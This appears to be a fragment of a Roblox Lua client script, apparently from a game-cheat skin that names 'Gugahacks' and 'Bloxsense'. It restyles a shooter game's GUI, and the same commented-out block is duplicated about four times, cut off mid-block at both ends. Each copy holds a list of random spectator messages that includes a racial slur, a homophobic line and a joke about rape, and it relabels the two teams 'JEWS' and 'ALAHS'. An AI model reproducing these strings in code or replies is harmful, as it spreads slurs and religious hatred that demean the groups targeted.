	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

